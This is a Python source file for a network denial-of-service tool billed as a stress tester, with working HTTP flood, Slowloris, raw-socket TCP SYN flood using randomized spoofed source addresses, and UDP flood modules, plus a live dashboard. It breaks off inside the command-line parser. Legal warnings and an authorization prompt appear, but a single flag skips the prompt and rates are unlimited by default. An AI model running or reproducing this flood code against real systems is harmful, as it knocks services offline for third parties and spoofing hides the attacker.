#!/usr/bin/env python3
"""
===============================================================================
  FU PERSON :: STRESS TESTER v1.0
  HTTP Flood | Slowloris | TCP Flood | UDP Flood | Live Dashboard
  Professional Network Stress Testing & Resilience Assessment
===============================================================================

  AUTHORIZATION REQUIRED - DO NOT USE WITHOUT WRITTEN PERMISSION

  LEGAL NOTICE:
  Unauthorized stress testing, denial-of-service simulation, or load testing
  against systems you do not own or have explicit written permission to test
  is ILLEGAL and may violate the CFAA and equivalent laws worldwide.
  Only use this tool against:
    1. Your own infrastructure
    2. Client systems with explicit written authorization
    3. Approved red-team / penetration-test engagements
    4. Training environments you control

  FLLC - Government-Cleared Security Operations
===============================================================================
"""

import os
import sys
import re
import json
import time
import queue
import struct
import socket
import random
import string
import logging
import argparse
import threading
from datetime import datetime, timezone
from dataclasses import dataclass, field, asdict
from typing import (
    List, Dict, Optional, Tuple, Any, Set, Callable,
)
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from ipaddress import IPv4Address, IPv4Network, ip_address
from urllib.parse import urlparse
import http.client
import urllib.request

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

try:
    import requests as _requests_lib
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from colorama import init as colorama_init
    colorama_init(autoreset=False)
except ImportError:
    pass


# =============================================================================
#  ANSI COLORS & DISPLAY
# =============================================================================

class C:
    R   = "\033[0m"
    BLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    WHT = "\033[97m"

    @staticmethod
    def p(text: str):
        try:
            print(text)
        except UnicodeEncodeError:
            print(re.sub(r"\033\[[0-9;]*m", "", str(text)))

    @staticmethod
    def ok(msg: str):
        C.p(f"  {C.GRN}[+]{C.R} {msg}")

    @staticmethod
    def info(msg: str):
        C.p(f"  {C.CYN}[*]{C.R} {msg}")

    @staticmethod
    def warn(msg: str):
        C.p(f"  {C.YLW}[!]{C.R} {msg}")

    @staticmethod
    def fail(msg: str):
        C.p(f"  {C.RED}[-]{C.R} {msg}")

    @staticmethod
    def section(title: str):
        w = 70
        C.p(f"\n  {C.CYN}{C.BLD}{'=' * w}")
        C.p(f"  {'':>2}{title}")
        C.p(f"  {'=' * w}{C.R}")


# =============================================================================
#  LOGGING
# =============================================================================

_LOG = logging.getLogger("stress_tester")
_LOG.setLevel(logging.INFO)
if not _LOG.handlers:
    _h = logging.StreamHandler(sys.stdout)
    _h.setFormatter(logging.Formatter(
        "[%(asctime)s] %(levelname)s  %(message)s", datefmt="%H:%M:%S"))
    _LOG.addHandler(_h)


# =============================================================================
#  DATA STRUCTURES
# =============================================================================

@dataclass
class StressResult:
    total_requests: int = 0
    success: int = 0
    failed: int = 0
    avg_latency_ms: float = 0.0
    rps: float = 0.0
    duration: float = 0.0
    errors_by_type: Dict[str, int] = field(default_factory=dict)
    timeline: List[Dict[str, Any]] = field(default_factory=list)
    peak_rps: float = 0.0
    min_latency_ms: float = float("inf")
    max_latency_ms: float = 0.0
    start_time: str = ""
    end_time: str = ""
    target: str = ""
    attack_type: str = ""


@dataclass
class SlowlorisResult:
    total_connections_opened: int = 0
    total_connections_dropped: int = 0
    total_reconnections: int = 0
    peak_open_connections: int = 0
    duration: float = 0.0
    target: str = ""


@dataclass
class AuthRecord:
    target: str = ""
    authorized_by: str = ""
    timestamp: str = ""
    method: str = ""


# =============================================================================
#  AUTHORIZATION GUARD
# =============================================================================

_BLOCKED_TLDS = {".gov", ".mil", ".edu"}
_PRIVATE_RANGES: List[IPv4Network] = [
    IPv4Network("10.0.0.0/8"),
    IPv4Network("172.16.0.0/12"),
    IPv4Network("192.168.0.0/16"),
    IPv4Network("127.0.0.0/8"),
]


class AuthorizationGuard:
    """Safety controls enforced before any stress test may execute."""

    def __init__(self, allow_private: bool = False, log_dir: Optional[str] = None):
        self.allow_private: bool = allow_private
        self.log_dir: str = log_dir or os.path.join(os.getcwd(), ".stress_logs")
        self.emergency_stop: threading.Event = threading.Event()
        self._rate_tokens: float = 0.0
        self._rate_max: float = 0.0
        self._rate_last: float = 0.0
        self._rate_lock: threading.Lock = threading.Lock()
        self._auth_log: List[AuthRecord] = []

    # --------------------------------------------------------------------- #

    def require_confirmation(self, target: str) -> bool:
        C.p("")
        C.p(f"  {C.RED}{C.BLD}{'=' * 66}")
        C.p(f"  {C.RED}{C.BLD}  WARNING - STRESS TEST AUTHORIZATION REQUIRED")
        C.p(f"  {C.RED}{C.BLD}{'=' * 66}{C.R}")
        C.p(f"  {C.YLW}Target: {C.WHT}{target}{C.R}")
        C.p(f"  {C.YLW}You are about to initiate a stress test that will generate")
        C.p(f"  {C.YLW}significant network traffic against the target above.{C.R}")
        C.p("")
        C.p(f"  {C.RED}Legal reminder:{C.R}")
        C.p(f"  {C.DIM}Performing stress tests against systems without explicit")
        C.p(f"  {C.DIM}written authorization is a criminal offense in most")
        C.p(f"  {C.DIM}jurisdictions (CFAA 18 U.S.C. 1030, CMA 1990, etc.).{C.R}")
        C.p("")
        try:
            answer = input(
                f"  {C.BLD}Do you have WRITTEN AUTHORIZATION to test this target? [y/N]: {C.R}"
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            C.fail("Aborted by user.")
            return False
        if answer not in ("y", "yes"):
            C.fail("Authorization denied. Aborting.")
            return False
        C.ok("Authorization confirmed by operator.")
        self.log_authorization(target, authorized_by="interactive-confirmation")
        return True

    # --------------------------------------------------------------------- #

    def check_scope(self, target: str) -> Tuple[bool, str]:
        hostname = target
        parsed = urlparse(target)
        if parsed.hostname:
            hostname = parsed.hostname

        for tld in _BLOCKED_TLDS:
            if hostname.endswith(tld):
                return False, f"Blocked TLD '{tld}' - government/military/education targets are prohibited"

        if hostname in ("localhost", "127.0.0.1", "::1"):
            if not self.allow_private:
                return False, "Localhost targets blocked (use --allow-private to override)"

        try:
            addr = ip_address(hostname)
            if not self.allow_private:
                for net in _PRIVATE_RANGES:
                    if addr in net:
                        return False, f"RFC1918 private address {addr} blocked (use --allow-private)"
        except ValueError:
            try:
                resolved = socket.gethostbyname(hostname)
                addr = ip_address(resolved)
                if not self.allow_private:
                    for net in _PRIVATE_RANGES:
                        if addr in net:
                            return False, f"Hostname resolves to private IP {resolved} (use --allow-private)"
            except socket.gaierror:
                pass

        return True, "OK"

    # --------------------------------------------------------------------- #

    def log_authorization(self, target: str, authorized_by: str) -> None:
        record = AuthRecord(
            target=target,
            authorized_by=authorized_by,
            timestamp=datetime.now(timezone.utc).isoformat(),
            method="stress-test",
        )
        self._auth_log.append(record)
        os.makedirs(self.log_dir, exist_ok=True)
        log_path = os.path.join(self.log_dir, "auth_log.jsonl")
        try:
            with open(log_path, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(asdict(record)) + "\n")
            C.info(f"Authorization logged to {log_path}")
        except OSError as exc:
            C.warn(f"Could not write auth log: {exc}")

    # --------------------------------------------------------------------- #

    def rate_limiter_init(self, max_rps: float) -> None:
        with self._rate_lock:
            self._rate_max = max_rps
            self._rate_tokens = max_rps
            self._rate_last = time.monotonic()

    def rate_limiter_acquire(self) -> None:
        if self._rate_max <= 0:
            return
        while True:
            with self._rate_lock:
                now = time.monotonic()
                elapsed = now - self._rate_last
                self._rate_last = now
                self._rate_tokens = min(
                    self._rate_max, self._rate_tokens + elapsed * self._rate_max
                )
                if self._rate_tokens >= 1.0:
                    self._rate_tokens -= 1.0
                    return
            time.sleep(1.0 / max(self._rate_max, 1))

    # --------------------------------------------------------------------- #

    def enforce(self, target: str, authorized_flag: bool) -> bool:
        ok, reason = self.check_scope(target)
        if not ok:
            C.fail(reason)
            return False
        if authorized_flag:
            self.log_authorization(target, authorized_by="cli-flag")
            return True
        return self.require_confirmation(target)


# =============================================================================
#  HTTP FLOOD
# =============================================================================

class HTTPFlood:
    """Concurrent HTTP request stress test with ramping and keep-alive modes."""

    METHODS = {"GET", "POST", "HEAD", "PUT"}

    def __init__(self, guard: AuthorizationGuard):
        self._guard: AuthorizationGuard = guard
        self._results_q: queue.Queue = queue.Queue()
        self._counter_lock = threading.Lock()
        self._stats = StressResult()

    # --------------------------------------------------------------------- #

    def run(
        self,
        url: str,
        threads: int = 10,
        duration: float = 30.0,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        body: Optional[str] = None,
        keep_alive: bool = False,
        ramp_seconds: float = 0.0,
        max_rps: float = 0,
    ) -> StressResult:
        method = method.upper()
        if method not in self.METHODS:
            C.fail(f"Unsupported HTTP method: {method}")
            return self._stats

        parsed = urlparse(url)
        if not parsed.scheme or not parsed.hostname:
            C.fail("Invalid URL - must include scheme and hostname")
            return self._stats

        self._stats = StressResult(
            target=url,
            attack_type=f"HTTP-{method}",
            start_time=datetime.now(timezone.utc).isoformat(),
        )

        if max_rps > 0:
            self._guard.rate_limiter_init(max_rps)

        C.section(f"HTTP FLOOD  |  {method}  |  {threads} threads  |  {duration}s")
        C.info(f"Target: {url}")
        C.info(f"Keep-Alive: {keep_alive}  |  Ramp: {ramp_seconds}s  |  RPS limit: {max_rps or 'none'}")

        stop_event = threading.Event()
        latencies: List[float] = []
        lat_lock = threading.Lock()
        errors: Dict[str, int] = defaultdict(int)
        err_lock = threading.Lock()
        success_count = [0]
        fail_count = [0]
        timeline: List[Dict[str, Any]] = []

        def _worker(worker_id: int) -> None:
            if ramp_seconds > 0:
                delay = (worker_id / max(threads, 1)) * ramp_seconds
                ramp_end = time.monotonic() + delay
                while time.monotonic() < ramp_end:
                    if stop_event.is_set() or self._guard.emergency_stop.is_set():
                        return
                    time.sleep(0.05)

            session: Optional[Any] = None
            if HAS_REQUESTS and keep_alive:
                session = _requests_lib.Session()

            while not stop_event.is_set() and not self._guard.emergency_stop.is_set():
                if max_rps > 0:
                    self._guard.rate_limiter_acquire()

                t0 = time.monotonic()
                try:
                    if HAS_REQUESTS:
                        self._http_request_requests(
                            session if keep_alive else None,
                            url, method, headers, body,
                        )
                    else:
                        self._http_request_urllib(url, method, headers, body)
                    elapsed_ms = (time.monotonic() - t0) * 1000
                    with lat_lock:
                        latencies.append(elapsed_ms)
                    with self._counter_lock:
                        success_count[0] += 1
                except Exception as exc:
                    with self._counter_lock:
                        fail_count[0] += 1
                    etype = type(exc).__name__
                    with err_lock:
                        errors[etype] += 1

            if session:
                session.close()

        def _timeline_sampler() -> None:
            start = time.monotonic()
            while not stop_event.is_set() and not self._guard.emergency_stop.is_set():
                time.sleep(1.0)
                now = time.monotonic()
                elapsed = now - start
                with self._counter_lock:
                    s = success_count[0]
                    f = fail_count[0]
                snap = {
                    "elapsed_s": round(elapsed, 1),
                    "total": s + f,
                    "success": s,
                    "failed": f,
                    "rps": round((s + f) / max(elapsed, 0.001), 1),
                }
                timeline.append(snap)
                self._results_q.put(snap)

        t_start = time.monotonic()
        sampler = threading.Thread(target=_timeline_sampler, daemon=True)
        sampler.start()

        pool_threads: List[threading.Thread] = []
        for i in range(threads):
            t = threading.Thread(target=_worker, args=(i,), daemon=True)
            t.start()
            pool_threads.append(t)

        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            C.warn("Interrupted by operator")
        finally:
            stop_event.set()

        for t in pool_threads:
            t.join(timeout=5.0)

        t_end = time.monotonic()
        total_dur = t_end - t_start

        self._stats.total_requests = success_count[0] + fail_count[0]
        self._stats.success = success_count[0]
        self._stats.failed = fail_count[0]
        self._stats.duration = round(total_dur, 2)
        self._stats.rps = round(self._stats.total_requests / max(total_dur, 0.001), 2)
        self._stats.errors_by_type = dict(errors)
        self._stats.timeline = timeline
        self._stats.end_time = datetime.now(timezone.utc).isoformat()

        if latencies:
            self._stats.avg_latency_ms = round(sum(latencies) / len(latencies), 2)
            self._stats.min_latency_ms = round(min(latencies), 2)
            self._stats.max_latency_ms = round(max(latencies), 2)
        if timeline:
            self._stats.peak_rps = max(s.get("rps", 0) for s in timeline)

        return self._stats

    @property
    def results_queue(self) -> queue.Queue:
        return self._results_q

    # --------------------------------------------------------------------- #

    @staticmethod
    def _http_request_requests(
        session: Optional[Any], url: str, method: str,
        headers: Optional[Dict[str, str]], body: Optional[str],
    ) -> None:
        hdrs = headers or {}
        caller = session or _requests_lib
        resp = caller.request(method, url, headers=hdrs, data=body, timeout=10, verify=False)
        resp.close()

    @staticmethod
    def _http_request_urllib(
        url: str, method: str,
        headers: Optional[Dict[str, str]], body: Optional[str],
    ) -> None:
        data = body.encode() if body else None
        req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            resp.read(1024)


# =============================================================================
#  SLOWLORIS ATTACK
# =============================================================================

class SlowlorisAttack:
    """Slow HTTP denial-of-service: hold connections open with partial headers."""

    def __init__(self, guard: AuthorizationGuard):
        self._guard: AuthorizationGuard = guard

    # --------------------------------------------------------------------- #

    def run(
        self,
        target: str,
        port: int = 80,
        sockets_count: int = 200,
        duration: float = 60.0,
        interval: float = 10.0,
        max_rps: float = 0,
    ) -> SlowlorisResult:
        result = SlowlorisResult(target=f"{target}:{port}")

        if max_rps > 0:
            self._guard.rate_limiter_init(max_rps)

        C.section(f"SLOWLORIS  |  {target}:{port}  |  {sockets_count} sockets  |  {duration}s")
        C.info(f"Header interval: {interval}s")

        sock_pool: List[Optional[socket.socket]] = []
        stop_event = threading.Event()
        stats_lock = threading.Lock()
        opened = [0]
        dropped = [0]
        reconnected = [0]
        peak_open = [0]

        def _create_socket() -> Optional[socket.socket]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                initial_header = (
                    f"GET /?{random.randint(1, 99999)} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                )
                s.send(initial_header.encode())
                with stats_lock:
                    opened[0] += 1
                return s
            except OSError:
                with stats_lock:
                    dropped[0] += 1
                return None

        C.info("Building initial socket pool...")
        for _ in range(sockets_count):
            if self._guard.emergency_stop.is_set():
                break
            if max_rps > 0:
                self._guard.rate_limiter_acquire()
            sock_pool.append(_create_socket())

        live = sum(1 for s in sock_pool if s is not None)
        with stats_lock:
            peak_open[0] = live
        C.ok(f"Initial pool: {live}/{sockets_count} sockets open")

        t_start = time.monotonic()

        def _keep_alive_loop() -> None:
            while not stop_event.is_set() and not self._guard.emergency_stop.is_set():
                time.sleep(interval)
                if stop_event.is_set() or self._guard.emergency_stop.is_set():
                    break

                header_line = f"X-a: {random.randint(1, 5000)}\r\n"
                for idx in range(len(sock_pool)):
                    if stop_event.is_set() or self._guard.emergency_stop.is_set():
                        break
                    s = sock_pool[idx]
                    if s is None:
                        sock_pool[idx] = _create_socket()
                        if sock_pool[idx] is not None:
                            with stats_lock:
                                reconnected[0] += 1
                        continue
                    try:
                        s.send(header_line.encode())
                    except OSError:
                        s.close()
                        sock_pool[idx] = None
                        with stats_lock:
                            dropped[0] += 1
                        sock_pool[idx] = _create_socket()
                        if sock_pool[idx] is not None:
                            with stats_lock:
                                reconnected[0] += 1

                current_live = sum(1 for s in sock_pool if s is not None)
                with stats_lock:
                    if current_live > peak_open[0]:
                        peak_open[0] = current_live
                C.info(f"[Slowloris] Active: {current_live}  Dropped: {dropped[0]}  Reconnected: {reconnected[0]}")

        worker = threading.Thread(target=_keep_alive_loop, daemon=True)
        worker.start()

        try:
            remaining = duration - (time.monotonic() - t_start)
            while remaining > 0 and not self._guard.emergency_stop.is_set():
                time.sleep(min(remaining, 1.0))
                remaining = duration - (time.monotonic() - t_start)
        except KeyboardInterrupt:
            C.warn("Interrupted by operator")
        finally:
            stop_event.set()

        worker.join(timeout=5.0)

        for s in sock_pool:
            if s:
                try:
                    s.close()
                except OSError:
                    pass

        result.total_connections_opened = opened[0]
        result.total_connections_dropped = dropped[0]
        result.total_reconnections = reconnected[0]
        result.peak_open_connections = peak_open[0]
        result.duration = round(time.monotonic() - t_start, 2)

        return result


# =============================================================================
#  TCP FLOOD
# =============================================================================

class TCPFlood:
    """TCP SYN flood simulator using raw sockets or rapid connect() fallback."""

    def __init__(self, guard: AuthorizationGuard):
        self._guard: AuthorizationGuard = guard

    # --------------------------------------------------------------------- #

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _build_syn_packet(
        self, src_ip: str, dst_ip: str, dst_port: int
    ) -> bytes:
        src_port = random.randint(1024, 65535)

        ip_ihl_ver = (4 << 4) | 5
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
            ip_frag_off, ip_ttl, ip_proto, ip_check,
            ip_saddr, ip_daddr,
        )

        tcp_seq = random.randint(0, 0xFFFFFFFF)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 0x02  # SYN
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_offset_res = (tcp_doff << 4) | 0

        tcp_header = struct.pack(
            "!HHIIBBHHH",
            src_port, dst_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window,
            tcp_check, tcp_urg_ptr,
        )

        pseudo_header = struct.pack(
            "!4s4sBBH", ip_saddr, ip_daddr, 0, socket.IPPROTO_TCP, len(tcp_header)
        )
        tcp_check = self._checksum(pseudo_header + tcp_header)
        tcp_header = struct.pack(
            "!HHIIBBHHH",
            src_port, dst_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window,
            tcp_check, tcp_urg_ptr,
        )

        return ip_header + tcp_header

    # --------------------------------------------------------------------- #

    def run(
        self,
        target: str,
        port: int = 80,
        duration: float = 30.0,
        rate: float = 0,
        randomize_source: bool = True,
        max_rps: float = 0,
    ) -> StressResult:
        result = StressResult(
            target=f"{target}:{port}",
            attack_type="TCP-SYN",
            start_time=datetime.now(timezone.utc).isoformat(),
        )

        if max_rps > 0:
            self._guard.rate_limiter_init(max_rps)

        effective_rate = max_rps if max_rps > 0 else rate

        C.section(f"TCP FLOOD  |  {target}:{port}  |  {duration}s  |  rate={effective_rate or 'max'}")

        try:
            dst_ip = socket.gethostbyname(target)
        except socket.gaierror as exc:
            C.fail(f"DNS resolution failed: {exc}")
            return result

        raw_available = False
        raw_sock: Optional[socket.socket] = None
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            raw_available = True
            C.ok("Raw socket mode active (source IP randomization available)")
        except (PermissionError, OSError):
            C.warn("Raw sockets unavailable - falling back to rapid connect() mode")

        stop_event = threading.Event()
        sent = [0]
        failed = [0]
        errors: Dict[str, int] = defaultdict(int)
        cnt_lock = threading.Lock()

        def _raw_sender() -> None:
            while not stop_event.is_set() and not self._guard.emergency_stop.is_set():
                if max_rps > 0:
                    self._guard.rate_limiter_acquire()
                src_ip = (
                    f"{random.randint(1,223)}.{random.randint(0,255)}."
                    f"{random.randint(0,255)}.{random.randint(1,254)}"
                    if randomize_source
                    else socket.gethostbyname(socket.gethostname())
                )
                pkt = self._build_syn_packet(src_ip, dst_ip, port)
                try:
                    raw_sock.sendto(pkt, (dst_ip, 0))  # type: ignore[union-attr]
                    with cnt_lock:
                        sent[0] += 1
                except OSError as exc:
                    with cnt_lock:
                        failed[0] += 1
                        errors[type(exc).__name__] += 1

        def _connect_sender() -> None:
            while not stop_event.is_set() and not self._guard.emergency_stop.is_set():
                if max_rps > 0:
                    self._guard.rate_limiter_acquire()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect_ex((dst_ip, port))
                    with cnt_lock:
                        sent[0] += 1
                except OSError as exc:
                    with cnt_lock:
                        failed[0] += 1
                        errors[type(exc).__name__] += 1
                finally:
                    try:
                        s.close()
                    except OSError:
                        pass

        worker_fn = _raw_sender if raw_available else _connect_sender
        thread_count = 4 if raw_available else 50
        threads: List[threading.Thread] = []
        t_start = time.monotonic()

        for _ in range(thread_count):
            t = threading.Thread(target=worker_fn, daemon=True)
            t.start()
            threads.append(t)

        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            C.warn("Interrupted by operator")
        finally:
            stop_event.set()

        for t in threads:
            t.join(timeout=5.0)

        if raw_sock:
            raw_sock.close()

        total_dur = time.monotonic() - t_start
        result.total_requests = sent[0] + failed[0]
        result.success = sent[0]
        result.failed = failed[0]
        result.duration = round(total_dur, 2)
        result.rps = round(result.total_requests / max(total_dur, 0.001), 2)
        result.errors_by_type = dict(errors)
        result.end_time = datetime.now(timezone.utc).isoformat()

        return result


# =============================================================================
#  UDP FLOOD
# =============================================================================

class UDPFlood:
    """UDP flood with configurable packet size and rate limiting."""

    def __init__(self, guard: AuthorizationGuard):
        self._guard: AuthorizationGuard = guard

    # --------------------------------------------------------------------- #

    def run(
        self,
        target: str,
        port: int = 53,
        duration: float = 30.0,
        packet_size: int = 1024,
        rate: float = 0,
        max_rps: float = 0,
    ) -> StressResult:
        packet_size = max(64, min(packet_size, 65507))

        result = StressResult(
            target=f"{target}:{port}",
            attack_type="UDP",
            start_time=datetime.now(timezone.utc).isoformat(),
        )

        if max_rps > 0:
            self._guard.rate_limiter_init(max_rps)

        effective_rate = max_rps if max_rps > 0 else rate

        C.section(f"UDP FLOOD  |  {target}:{port}  |  {duration}s  |  size={packet_size}B  |  rate={effective_rate or 'max'}")

        try:
            dst_ip = socket.gethostbyname(target)
        except socket.gaierror as exc:
            C.fail(f"DNS resolution failed: {exc}")
            return result

        stop_event = threading.Event()
        sent = [0]
        failed = [0]
        errors: Dict[str, int] = defaultdict(int)
        cnt_lock = threading.Lock()

        def _sender() -> None:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random.randbytes(packet_size)
            regen_counter = 0

            while not stop_event.is_set() and not self._guard.emergency_stop.is_set():
                if max_rps > 0:
                    self._guard.rate_limiter_acquire()
                try:
                    s.sendto(payload, (dst_ip, port))
                    with cnt_lock:
                        sent[0] += 1
                except OSError as exc:
                    with cnt_lock:
                        failed[0] += 1
                        errors[type(exc).__name__] += 1

                regen_counter += 1
                if regen_counter >= 1000:
                    payload = random.randbytes(packet_size)
                    regen_counter = 0

            s.close()

        thread_count = 8
        threads: List[threading.Thread] = []
        t_start = time.monotonic()

        for _ in range(thread_count):
            t = threading.Thread(target=_sender, daemon=True)
            t.start()
            threads.append(t)

        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            C.warn("Interrupted by operator")
        finally:
            stop_event.set()

        for t in threads:
            t.join(timeout=5.0)

        total_dur = time.monotonic() - t_start
        result.total_requests = sent[0] + failed[0]
        result.success = sent[0]
        result.failed = failed[0]
        result.duration = round(total_dur, 2)
        result.rps = round(result.total_requests / max(total_dur, 0.001), 2)
        result.errors_by_type = dict(errors)
        result.end_time = datetime.now(timezone.utc).isoformat()

        return result


# =============================================================================
#  STRESS REPORTER
# =============================================================================

class StressReporter:
    """Live terminal dashboard and post-test reporting."""

    def __init__(self):
        self._stop: threading.Event = threading.Event()

    # --------------------------------------------------------------------- #

    def live_display(self, results_queue: queue.Queue, stop_event: threading.Event) -> None:
        C.p("")
        C.p(f"  {C.BLD}{C.CYN}--- LIVE DASHBOARD ---{C.R}")
        while not stop_event.is_set():
            try:
                snap = results_queue.get(timeout=1.0)
            except queue.Empty:
                continue
            elapsed = snap.get("elapsed_s", 0)
            total = snap.get("total", 0)
            success = snap.get("success", 0)
            fail = snap.get("failed", 0)
            rps = snap.get("rps", 0)
            success_pct = (success / total * 100) if total else 0
            bar_len = 30
            filled = int(bar_len * success_pct / 100) if total else 0
            bar = f"{C.GRN}{'#' * filled}{C.RED}{'.' * (bar_len - filled)}{C.R}"

            C.p(
                f"\r  {C.BLD}[{elapsed:>7.1f}s]{C.R}  "
                f"RPS: {C.CYN}{rps:>8.1f}{C.R}  "
                f"Total: {C.WHT}{total:>10}{C.R}  "
                f"OK: {C.GRN}{success}{C.R}  "
                f"Fail: {C.RED}{fail}{C.R}  "
                f"[{bar}] {success_pct:>5.1f}%"
            )

    # --------------------------------------------------------------------- #

    @staticmethod
    def generate_report(result: StressResult) -> str:
        lines: List[str] = []
        lines.append("")
        lines.append(f"  {C.CYN}{C.BLD}{'=' * 60}")
        lines.append(f"  STRESS TEST REPORT")
        lines.append(f"  {'=' * 60}{C.R}")
        lines.append(f"  {C.BLD}Target:{C.R}       {result.target}")
        lines.append(f"  {C.BLD}Type:{C.R}         {result.attack_type}")
        lines.append(f"  {C.BLD}Start:{C.R}        {result.start_time}")
        lines.append(f"  {C.BLD}End:{C.R}          {result.end_time}")
        lines.append(f"  {C.BLD}Duration:{C.R}     {result.duration}s")
        lines.append(f"  {C.CYN}{'- ' * 30}{C.R}")
        lines.append(f"  {C.BLD}Total Reqs:{C.R}   {result.total_requests:,}")
        lines.append(f"  {C.GRN}Success:{C.R}      {result.success:,}")
        lines.append(f"  {C.RED}Failed:{C.R}       {result.failed:,}")
        lines.append(f"  {C.BLD}Avg RPS:{C.R}      {result.rps:,.2f}")
        lines.append(f"  {C.BLD}Peak RPS:{C.R}     {result.peak_rps:,.2f}")
        lines.append(f"  {C.CYN}{'- ' * 30}{C.R}")
        lines.append(f"  {C.BLD}Avg Latency:{C.R}  {result.avg_latency_ms:.2f} ms")
        lines.append(f"  {C.BLD}Min Latency:{C.R}  {result.min_latency_ms:.2f} ms")
        lines.append(f"  {C.BLD}Max Latency:{C.R}  {result.max_latency_ms:.2f} ms")
        if result.errors_by_type:
            lines.append(f"  {C.CYN}{'- ' * 30}{C.R}")
            lines.append(f"  {C.RED}{C.BLD}Errors:{C.R}")
            for etype, count in sorted(result.errors_by_type.items(), key=lambda x: -x[1]):
                lines.append(f"    {C.RED}{etype}:{C.R} {count:,}")
        lines.append(f"  {C.CYN}{C.BLD}{'=' * 60}{C.R}")
        lines.append("")

        report_text = "\n".join(lines)
        C.p(report_text)
        return report_text

    # --------------------------------------------------------------------- #

    @staticmethod
    def generate_report_slowloris(result: SlowlorisResult) -> str:
        lines: List[str] = []
        lines.append("")
        lines.append(f"  {C.CYN}{C.BLD}{'=' * 60}")
        lines.append(f"  SLOWLORIS REPORT")
        lines.append(f"  {'=' * 60}{C.R}")
        lines.append(f"  {C.BLD}Target:{C.R}            {result.target}")
        lines.append(f"  {C.BLD}Duration:{C.R}          {result.duration}s")
        lines.append(f"  {C.CYN}{'- ' * 30}{C.R}")
        lines.append(f"  {C.BLD}Opened:{C.R}            {result.total_connections_opened:,}")
        lines.append(f"  {C.RED}Dropped:{C.R}           {result.total_connections_dropped:,}")
        lines.append(f"  {C.YLW}Reconnections:{C.R}     {result.total_reconnections:,}")
        lines.append(f"  {C.GRN}Peak Open:{C.R}         {result.peak_open_connections:,}")
        lines.append(f"  {C.CYN}{C.BLD}{'=' * 60}{C.R}")
        lines.append("")
        report_text = "\n".join(lines)
        C.p(report_text)
        return report_text

    # --------------------------------------------------------------------- #

    @staticmethod
    def export_json(result: Any, path: str) -> None:
        data = asdict(result)
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2, default=str)
        C.ok(f"JSON report saved to {path}")


# =============================================================================
#  BANNER
# =============================================================================

BANNER = rf"""
{C.RED}{C.BLD}
   ███████╗████████╗██████╗ ███████╗███████╗███████╗
   ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝
   ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗
   ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║
   ███████║   ██║   ██║  ██║███████╗███████║███████║
   ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
{C.R}{C.YLW}   ──────── STRESS TESTER v1.0 ── AUTHORIZED USE ONLY ────────{C.R}
{C.DIM}   FLLC  |  Network Resilience Assessment  |  Authorized Only{C.R}
"""


# =============================================================================
#  CLI
# =============================================================================

def _add_common_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--authorized", action="store_true",
                        help="Confirm you have written authorization (skip interactive prompt)")
    parser.add_argument("--max-rps", type=float, default=0,
                        help="Maximum requests per second (0 = unlimited)")
    parser.add_argument("--allow-private", action="store_true",
                        help="Allow targeting private/RFC1918 addresses")
    parser.add_argument("--output", "-o", type=str, default="",
                        help="Save JSON report to file")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="stress_tester",
        description="FU PERSON - Professional Network Stress Tester (FLLC)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="LEGAL: Authorized use only. Unauthorized testing is a criminal offense.",
    )
    sub = parser.add_subparsers(dest="command", help="Attack type")

    # -- HTTP --
    p_http = sub.add_parser("http", help="HTTP flood stress test")
    p_http.add_argument("url", help="Target URL (http[s]://...)")
